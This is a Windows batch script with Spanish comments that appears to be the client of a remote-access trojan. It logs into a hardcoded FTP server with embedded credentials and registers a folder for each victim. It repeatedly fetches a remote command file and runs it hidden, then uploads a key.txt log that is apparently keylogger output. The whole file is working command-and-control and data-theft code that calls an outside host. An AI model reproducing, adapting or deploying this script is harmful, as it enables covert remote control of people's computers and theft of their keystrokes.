@echo off
cls
@echo off
color 00a

:INI
::Datos del servidor
set server=dostg.ddns.net
set user=lordbunny
set password=125643
:EJECUTAR_PROGRAMAS
set NC=1
set batSHELL=1
set batUSB=1
set HTPC=1
set batKEY=1
set NIRCMD=1
set WGET=1
set NCFTP=1

:INICIAR
echo Comprobando conexion...
ping %server% > nul
if %errorlevel% == 0 goto CONTINUA else ERRORC
:ERRORC
echo Pausando por 30 segundos...
ping localhost -n 30 >nul
goto INICIAR

:CONTINUA
echo Si hay conectividad!!
echo Crear host o iniciar shell
if exist dircreated.ftp goto COMANDOS

:CREARs
echo Creando host...
echo open %server%>dircreated.ftp
echo user %user% %password%>>dircreated.ftp
echo mkdir %COMPUTERNAME%-%USERNAME%-%PROCESSOR_REVISION%>>dircreated.ftp
echo bye>>dircreated.ftp
ping localhost -n 2 >nul
ftp -n <dircreated.ftp
echo Se llevo a cabo la intalacion en los servidores!

:COMANDOS
taskkill /im ping.exe /f
echo Recibiendo comandos...
ncftpget -u %user% -p %password% %server% . /%COMPUTERNAME%-%USERNAME%-%PROCESSOR_REVISION%/comandos.bat

if not exist comandos.bat goto ELIMINAR

:EJECUTAR
for %%A in (comandos.bat) do set size=%%~zA
IF %size%==0 GOTO ELIMINAR
echo Ejecutando comandos...
nircmd exec2 hide C:\ProgramData\tool "C:\ProgramData\tool\comandos.bat"

:ELIMINAR
echo Eliminado registros del servidor...
echo open %server%>foo.ftp
echo user %user% %password%>>foo.ftp
echo cd %COMPUTERNAME%-%USERNAME%-%PROCESSOR_REVISION%>>foo.ftp
echo binary>>foo.ftp
echo delete comandos.bat>>foo.ftp
echo bye>>foo.ftp
FTP -n <foo.ftp

del comandos.bat
DEL foo.ftp

echo Enviando logs
ncftpput -u %user% -p %password% %server% /%COMPUTERNAME%-%USERNAME%-%PROCESSOR_REVISION% key.txt

::1 minuto de delay
ping localhost -n 30 >nul
goto INICIAR
